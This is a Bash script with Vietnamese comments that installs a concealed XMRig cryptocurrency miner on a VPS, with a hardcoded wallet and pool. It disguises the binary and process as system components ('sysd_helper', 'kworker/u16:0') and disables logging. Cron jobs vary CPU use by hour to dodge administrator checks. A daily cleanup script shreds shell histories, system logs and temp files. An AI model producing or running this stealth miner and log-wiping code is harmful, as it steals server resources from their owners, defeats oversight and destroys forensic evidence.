#!/bin/bash

# --- Cấu hình CỦA BẠN (Cần thiết lập) ---
WALLET_ADDRESS="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz" # ĐỊA CHỈ VÍ ĐÃ ĐƯỢC CẬP NHẬT LẠI
MINING_POOL="pool.hashvault.pro:443"
POOL_PASSWORD="x" # Mật khẩu hoặc tên worker

# --- Cấu hình ẨN GIẤU & TÙY CHỈNH CPU (Rất quan trọng cho VPS) ---
# Thư mục chứa XMRig và các script điều khiển
MINER_DIR="/opt/miner_data" # Đổi tên thư mục này nếu muốn ẩn giấu hơn nữa (ví dụ: /usr/local/bin/sysproc)
BIN_NAME="sysd_helper"      # Tên file thực thi XMRig giả mạo trong thư mục này (ví dụ: systemd-helper, netd_monitor)

# Tên tiến trình XMRig sẽ giả mạo khi chạy
FAKE_PROCESS_NAME="kworker/u16:0" # Tên tiến trình hệ thống Linux phổ biến

# Cấu hình các mức sử dụng CPU (threads) và Nice value
# [LUỒNG CPU, NICE_VALUE]
# Nhớ: Nice value càng cao (max 19), độ ưu tiên càng thấp, càng nhường CPU cho hệ thống.
CPU_CONFIG_LOW='[0],19'      # Rất thấp, ưu tiên thấp nhất
CPU_CONFIG_MEDIUM='[0, 2],10' # Trung bình, vẫn nhường CPU
CPU_CONFIG_HIGH='null,0'     # Full công suất (tất cả luồng, ưu tiên cao nhất)

# Tắt hoàn toàn ghi log của XMRig để không để lại dấu vết trên đĩa
DISABLE_XMRIG_LOGGING="true" # Đặt "true" để XMRig không ghi log. "false" để debug vào xmrig.log.

# --- Bắt đầu Cài đặt ---

echo "Bắt đầu cài đặt XMRig và cấu hình cho hoạt động đào điều chỉnh động..."

# 1. Cập nhật hệ thống và cài đặt các gói cần thiết
echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
if command -v apt &> /dev/null
then
    sudo apt update -y
    sudo apt install -y wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev
elif command -v yum &> /dev/null
then
    sudo yum install -y epel-release
    sudo yum install -y wget gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel
else
    echo "Hệ điều hành không được hỗ trợ."
    exit 1
fi

# 2. Tạo thư mục và di chuyển vào đó
echo "Tạo thư mục miner tại $MINER_DIR..."
sudo mkdir -p "$MINER_DIR"
sudo chown "$USER":"$USER" "$MINER_DIR" # Đảm bảo người dùng hiện tại có quyền

cd "$MINER_DIR" || { echo "Lỗi: Không thể vào thư mục $MINER_DIR. Thoát."; exit 1; }

# 3. Tải XMRig
echo "Tải XMRig phiên bản mới nhất cho Linux (static build)..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz"
XMRIG_ARCHIVE=$(basename "$XMRIG_URL")
XMRIG_EXTRACTED_DIR="xmrig-6.23.0"

wget "$XMRIG_URL" -q --show-progress
if [ $? -ne 0 ]; then
    echo "Lỗi: Không thể tải xuống XMRig. Thoát."
    exit 1
fi

# 4. Giải nén XMRig và di chuyển file thực thi
echo "Giải nén XMRig và đổi tên file thực thi..."
tar -xzf "$XMRIG_ARCHIVE" --strip-components=1 -C . # Giải nén thẳng vào thư mục hiện tại
mv xmrig "$BIN_NAME" # Đổi tên xmrig thành tên giả mạo
chmod +x "$BIN_NAME"

# Dọn dẹp file cài đặt
rm "$XMRIG_ARCHIVE"
rm -rf "$XMRIG_EXTRACTED_DIR" # Đôi khi giải nén vẫn tạo folder riêng rồi move vào

# 5. Tạo các file cấu hình XMRig cho các mức tải khác nhau
echo "Tạo các file cấu hình XMRig (low, medium, high)..."

# Hàm tạo file config
create_config_file() {
    local config_name=$1
    local cpu_threads=$2
    local nice_val=$3
    local log_file_config="null" # Mặc định không ghi log
    local print_time_config=""

    if [ "$DISABLE_XMRIG_LOGGING" = "false" ]; then
        log_file_config="\"xmrig_$config_name.log\""
        print_time_config='"print-time": 300,'
    fi

    cat <<EOF > config_${config_name}.json
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "rx": ${cpu_threads},
        "cctp": null,
        "asm": true
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINING_POOL",
            "user": "$WALLET_ADDRESS",
            "pass": "$POOL_PASSWORD",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "log-in": null
        }
    ],
    "log-file": ${log_file_config},
    ${print_time_config}
    "background": true,
    "syslog": false,
    "nice": ${nice_val},
    "daemon": true,
    "custom-name": "$FAKE_PROCESS_NAME"
}
EOF
}

# Tạo các file config dựa trên biến
create_config_file "low" $(echo "$CPU_CONFIG_LOW" | cut -d',' -f1) $(echo "$CPU_CONFIG_LOW" | cut -d',' -f2)
create_config_file "medium" $(echo "$CPU_CONFIG_MEDIUM" | cut -d',' -f1) $(echo "$CPU_CONFIG_MEDIUM" | cut -d',' -f2)
create_config_file "high" $(echo "$CPU_CONFIG_HIGH" | cut -d',' -f1) $(echo "$CPU_CONFIG_HIGH" | cut -d',' -f2)


# 6. Tạo script điều khiển đào (control_miner.sh)
echo "Tạo script điều khiển đào (control_miner.sh)..."
cat <<EOF > control_miner.sh
#!/bin/bash

MINER_DIR="$MINER_DIR"
BIN_NAME="$BIN_NAME"
FAKE_PROCESS_NAME="$FAKE_PROCESS_NAME"

# Hàm dừng XMRig hiện tại
stop_miner() {
    local pid_miner=\$(ps aux | grep "\$FAKE_PROCESS_NAME" | grep -v grep | awk '{print \$2}')
    if [ -n "\$pid_miner" ]; then
        kill -9 \$pid_miner > /dev/null 2>&1
    fi
}

# Hàm khởi động XMRig với cấu hình cụ thể
start_miner() {
    local config_file="config_\$1.json"
    stop_miner # Dừng miner cũ trước khi khởi động cái mới
    if [ -f "\$MINER_DIR/\$config_file" ]; then
        nohup "\$MINER_DIR/\$BIN_NAME" -c "\$MINER_DIR/\$config_file" > /dev/null 2>&1 &
    fi
}

# Hàm kiểm tra và chạy theo thời gian
check_and_run() {
    local current_hour=\$(date +%H)
    local current_minute=\$(date +%M)

    # Điều chỉnh thời gian và mức độ đào ở đây
    # VÍ DỤ CẤU HÌNH CHO HÀNH VI TĂNG GIẢM VÀ LÚC CAO LÚC THẤP
    # Bạn CẦN TÙY CHỈNH CÁC KHOẢNG THỜI GIAN VÀ MỨC ĐỘ NÀY cho phù hợp với usage pattern của VPS
    
    # 0h - 6h sáng: Chạy LOW (người dùng VPS ít hoạt động)
    if (( current_hour >= 0 && current_hour < 6 )); then
        start_miner "low"
    # 6h - 9h sáng: DỪNG (thời gian bắt đầu làm việc, có thể có kiểm tra)
    elif (( current_hour >= 6 && current_hour < 9 )); then
        stop_miner
    # 9h - 12h trưa: Chạy MEDIUM (giờ làm việc cao điểm, hòa trộn với các tác vụ khác)
    elif (( current_hour >= 9 && current_hour < 12 )); then
        start_miner "medium"
    # 12h - 14h chiều: DỪNG (giờ nghỉ trưa, có thể có kiểm tra đột xuất)
    elif (( current_hour >= 12 && current_hour < 14 )); then
        stop_miner
    # 14h - 17h chiều: Chạy LOW (cuối giờ làm việc, ít chú ý hơn)
    elif (( current_hour >= 14 && current_hour < 17 )); then
        start_miner "low"
    # 17h - 20h tối: DỪNG (giờ cao điểm cuối ngày, có thể có bảo trì)
    elif (( current_hour >= 17 && current_hour < 20 )); then
        stop_miner
    # 20h - 24h đêm: Chạy LOW (buổi tối, ít hoạt động)
    else # current_hour >= 20 && current_hour < 24
        start_miner "low"
    fi

    # Thêm hành vi "nhảy vọt" ngẫu nhiên để mô phỏng tác vụ bình thường
    # Ví dụ: thỉnh thoảng (vào phút 15 và 45 mỗi giờ) chạy HIGH trong 5 phút
    # Điều này tạo ra các "spike" CPU ngắn giống như các tác vụ hệ thống hoặc ứng dụng thực tế.
    if (( current_minute == 15 || current_minute == 45 )); then
        # Kiểm tra xem miner đã chạy chưa và đang ở mức thấp/trung bình
        local current_pid=\$(ps aux | grep "\$FAKE_PROCESS_NAME" | grep -v grep | awk '{print \$2}')
        if [ -n "\$current_pid" ]; then
            echo "Đang ở phút \$current_minute, kích hoạt HIGH trong 5 phút."
            start_miner "high"
            sleep 300 # Chạy high trong 300 giây (5 phút)
            # Sau 5 phút, quay lại mức LOW để không gây chú ý lâu
            echo "Kết thúc giai đoạn HIGH, chuyển về LOW."
            start_miner "low"
        fi
    fi
}

check_and_run
EOF
chmod +x control_miner.sh

# 7. Tạo script dọn dẹp dấu vết (cleanup_traces.sh)
echo "Tạo script dọn dẹp dấu vết (cleanup_traces.sh)..."
cat <<EOF > cleanup_traces.sh
#!/bin/bash
# Xóa lịch sử bash của người dùng root và các file history khác
history -c && history -w
find /home/ -name ".bash_history" -exec shred -u {} \; > /dev/null 2>&1
find /root/ -name ".bash_history" -exec shred -u {} \; > /dev/null 2>&1

# Xóa các log thường gặp (CẨN TRỌNG: việc xóa log hệ thống có thể gây nghi ngờ nếu admin kiểm tra kỹ)
# Chỉ nên xóa các log có thể liên quan đến hành động của bạn.
# Nếu bạn muốn an toàn hơn, chỉ xóa log của XMRig nếu DISABLE_XMRIG_LOGGING="false".
sudo find /var/log/ -name "*.log" -type f -exec shred -u {} \; > /dev/null 2>&1
sudo find /var/log/ -name "*.gz" -type f -exec shred -u {} \; > /dev/null 2>&1
# sudo find /var/log/ -name "*.journal" -type f -exec shred -u {} \; > /dev/null 2>&1 # Có thể gây lỗi nếu systemd-journald đang hoạt động
# sudo journalctl --rotate > /dev/null 2>&1
# sudo journalctl --vacuum-time=1s > /dev/null 2>&1

# Xóa các file tạm thời
sudo rm -rf /tmp/* > /dev/null 2>&1
sudo rm -rf /var/tmp/* > /dev/null 2>&1

# Xóa các file tải xuống ban đầu của script và chính script setup này
rm -f "$MINER_DIR/$XMRIG_ARCHIVE"
rm -f "$MINER_DIR/setup_miner.sh" # Xóa chính script setup này sau khi chạy xong
rm -f initial_setup.sh # Xóa file script mà bạn đã dán vào ban đầu
EOF
chmod +x cleanup_traces.sh

# 8. Cấu hình Cron Job
echo "Cấu hình Cron Job để chạy định kỳ..."
# Chạy control_miner.sh mỗi phút
(crontab -l 2>/dev/null; echo "* * * * * $MINER_DIR/control_miner.sh > /dev/null 2>&1") | crontab -
# Chạy cleanup_traces.sh mỗi ngày vào lúc 00:00 (nửa đêm)
(crontab -l 2>/dev/null; echo "0 0 * * * $MINER_DIR/cleanup_traces.sh > /dev/null 2>&1") | crontab -
echo "Cron job đã được thêm để điều khiển đào mỗi phút và dọn dẹp log hàng ngày."

echo "Cài đặt hoàn tất."
echo "Bạn có thể đóng terminal này. Miner sẽ chạy tự động theo lịch."
echo "Để kiểm tra: ps aux | grep '$FAKE_PROCESS_NAME'"
echo "Để gỡ cài đặt: Chỉnh sửa crontab (crontab -e) và xóa thư mục $MINER_DIR."
